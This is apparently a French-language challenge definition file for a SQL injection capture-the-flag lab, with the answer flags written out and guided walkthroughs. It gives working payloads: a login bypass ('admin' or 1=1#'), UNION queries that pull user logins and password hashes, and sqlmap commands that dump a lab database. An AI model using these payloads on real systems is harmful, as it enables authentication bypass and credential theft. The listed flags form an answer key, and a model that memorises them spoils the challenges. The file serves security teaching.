#
# Ce fichier décrit les challenges 
#
#[Challenge_]
#name:  
#value: 
#category:  
#flag:  
#file:  (optionnel)
#description: 



[Challenge_1]
name: Une Authent en béton 
value: 10
category: SQLi
flag:  flag{T0uj0urs_f1ltr3r_l3s_1nputs}
description: 
    ```
    https://{IP_SERVER}/sqli/login.php
    ```
    Tente de te commecter avec le compte admin et le mot de passe admin. On ne sait jamais...</br></br>

    Comment passer l'authentification quand on ne connait pas le mot de passe ?</br></br>

    Par chance, le site est encore un prototype et le développeur a laissé actif des options pour débugguer.</br>
    Tu vois qu'il utilise une base de donnée SQL pour gérer les utilisateurs.</br></br>
    
    Il utilise la requête :SELECT * FROM users WHERE login='admin' AND passwd=md5('admin')</br></br>

    Ajoute une quote ' à la fin du nom de user et regarde le résultat...</br>
    Cette quote a corrompu la requête SQL. Good. Nous pouvons la modifier pour la réécrire.</br></br>

    Essaye de te connecter avec comme nom de compte: 
    ```
    admin' or 1=1#
    ```
    Nous générons la requète: 
    ```
    SELECT * FROM users WHERE login='admin' or 1=1#' AND passwd=md5('admin')
    ```
    Tous les caractère après le # sont ignorés comme des commentaires.</br>
    Le filtre devient 
    ```
    login='admin' or 1=1
    ```
    Nous sommes authentifié comme le premier user de la base de donnée.
    




[Challenge_2]
name:  Une balade de santé
value: 10
category: SQLi
flag:  flag_S3ri3ux_m4n_f4ut_f1ltr3r_l3s_1nputs
description: 
    Regarde l'url de consultation des messages, et le texte de débug en bas.</br>
    La valeur 673489 est passée en paramètre de la requète SQL.</br></br>

    Nous allons faire une Injection SQL utilisant UNION.</br>    
    Remplace cette valeur par
    ```
    673489 UNION select login from users
    ```

    Tu vas générer la requète : 
    ```
    SELECT msg FROM messages WHERE idmsg= 673489 UNION select login from users
    ```
    Cette requète va ajouter les logins des utilisateurs à la fin de la liste des messages.



[Challenge_3]
name:  Dans ton SQL, s'il te plait monsieur
value: 10
category: SQLi
flag:  flag_P0wn3d_Y0L0
description: 
    Continue sur la même url. Cette fois, en plus de noms des users, on va récupérer le hash de leurs password...</br></br>

    Remplace le paramètre 673489 par : 
    ```
    673489 UNION select concat(login," ",passwd) from users
    ```

    Tu vas générer la requète : 
    ```
    SELECT msg FROM messages WHERE idmsg= 673489 UNION select concat(login," ",passwd) from users
    ```
    Qui va concaténer la liste des users et leur hash de leur password à la fin de la liste des messages.



[Challenge_sqlmap]
name:  Sans les mains...
value: 10
category: SQLi
flag:  flag{L4_C_3st_bi3n_r4ng3}
description: 
    A partir du moment ou nous avons un champ utisable, il est possible de récupérer TOUTE la base de donnée. </br>
    Ca peut se faire à la main, ou sans les mains avec sqlmap : [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

    A partir du terminal, le serveur se nomme : ctf-sqli, et est accessible en http.
    ```
    sqlmap -u http://ctf-sqli/getmsg.php?idmsg=673489 --tables

    Database: dbmccoy
    [2 tables]
    +---------------------------------------+
    | messages                              |
    | users                                 |
    +---------------------------------------+

    Database: information_schema
    [59 tables]
    +---------------------------------------+
    | CHARACTER_SETS                        |
    | COLLATIONS                            |
    | COLLATION_CHARACTER_SET_APPLICABILITY |
    | COLUMNS                               |
    ```
    </br>
    Nous récupèrons non seulement les tables de notre base `dbmccoy`, mais en plus toute la structure de mysql.
    </br>
    ```
    sqlmap -u http://ctf-sqli/getmsg.php?idmsg=673489 -D dbmccoy -T bonus --dump
    ```
    </br>
    Regardons le contenu de la table bonus...



    






